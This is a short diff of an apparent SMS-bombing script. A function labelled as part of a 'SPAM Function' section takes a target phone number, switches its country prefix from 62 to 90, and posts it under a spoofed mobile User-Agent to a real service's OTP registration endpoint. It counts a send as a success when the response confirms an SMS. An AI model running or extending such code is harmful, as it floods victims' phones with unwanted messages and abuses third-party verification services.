@@ -42,7 +42,7 @@ def input():
     main()
 #-------------------------------SPAM Function-------------------------------------------
 def asakita():
-  data={'username':'62'+nom}
+  data={'username':'90'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
    sukses("1","sms","asakita")
